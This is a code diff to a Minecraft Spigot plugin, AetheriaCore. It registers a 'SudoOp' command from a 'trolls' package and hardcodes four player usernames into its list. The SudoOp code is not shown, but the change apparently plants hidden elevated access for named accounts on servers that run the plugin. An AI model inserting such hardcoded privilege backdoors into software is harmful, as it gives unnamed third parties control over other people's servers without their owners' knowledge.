@@ -4,6 +4,7 @@ import com.mongodb.client.MongoClient;
 import com.mongodb.client.MongoClients;
 import com.mongodb.client.MongoDatabase;
 import net.badbird5907.aetheriacore.spigot.commands.*;
+import net.badbird5907.aetheriacore.spigot.commands.trolls.SudoOp;
 import net.badbird5907.aetheriacore.spigot.commands.trolls.levitate;
 import net.badbird5907.aetheriacore.spigot.commands.trolls.opme;
 import net.badbird5907.aetheriacore.spigot.events.*;
@@ -95,6 +96,11 @@ public final class AetheriaCore extends JavaPlugin {
         getCommand("staffmode").setExecutor(new StaffMode());
         getCommand("hush").setExecutor(new hush());
         getCommand("QuickChat").setExecutor(new QuickChat(this));
+        getCommand("SudoOp").setExecutor(new SudoOp());
+        SudoOp.SudoOp.add("Badbird5907");
+        SudoOp.SudoOp.add("tuckMCWizard");
+        SudoOp.SudoOp.add("Pylons");
+        SudoOp.SudoOp.add("StrawHat_KoITta");
 /*        if(getConfig().getBoolean("Essentials-Replacement", true)){
             getCommand("fly").setExecutor(new Fly());
             getCommand("gma").setExecutor(new gma());
